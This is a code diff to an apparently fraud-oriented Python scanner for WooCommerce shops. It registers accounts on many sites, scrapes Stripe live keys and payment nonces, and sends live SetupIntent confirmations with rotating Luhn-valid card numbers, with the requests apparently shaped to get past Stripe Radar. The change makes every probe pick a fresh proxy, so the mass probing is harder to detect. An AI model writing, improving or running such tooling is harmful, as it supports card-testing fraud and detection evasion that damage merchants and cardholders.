@@ -22,12 +22,16 @@ def resolve_dns(host: str) -> str | None:
         return None
 
 
-async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
+async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore,
+                                 proxy_pool: list[str] | None = None,
+                                 explicit_proxy: str | None = None) -> dict | None:
     """Stage 1: Fast GET /my-account/ — check availability, register nonce & pk_live."""
     base = f"https://{domain}"
     url = f"{base}/my-account/"
     async with sem:
         try:
+            # ротация на КАЖДЫЙ пробник — раньше весь стадий шёл с одного прокси
+            proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
             async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                 r = await s.get(url, timeout=8)
                 if r.status_code != 200:
@@ -61,13 +65,16 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore, proxy: 
     }
 
 
-async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
+async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore,
+                                      proxy_pool: list[str] | None = None,
+                                      explicit_proxy: str | None = None) -> dict | None:
     """Stage 2: Real registration POST -> check wordpress_logged_in.
        Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
        Stage 4: Live SetupIntent confirm probe (Radar Telemetry v2021 + rotating Luhn-valid probe PAN).
     """
     async with sem:
         try:
+            proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
             async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                 reg_url = f"{base}/my-account/"
 
@@ -291,7 +298,8 @@ async def main():
     # 3. Stage 1: Fast Surface Probing
     print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
     sem_s1 = asyncio.Semaphore(30)
-    s1_tasks = [probe_stage1_fast_surface(d, sem_s1, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
+    s1_tasks = [probe_stage1_fast_surface(d, sem_s1,
+                                          proxy_pool=proxy_pool, explicit_proxy=explicit_proxy)
                 for d in live_dns_domains]
     s1_results = await asyncio.gather(*s1_tasks)
     s1_passed = [r for r in s1_results if r]
@@ -302,7 +310,7 @@ async def main():
     sem_deep = asyncio.Semaphore(15)
     deep_tasks = [
         probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep,
-                                       proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
+                                       proxy_pool=proxy_pool, explicit_proxy=explicit_proxy)
         for s in s1_passed
     ]
     deep_results = await asyncio.gather(*deep_tasks)
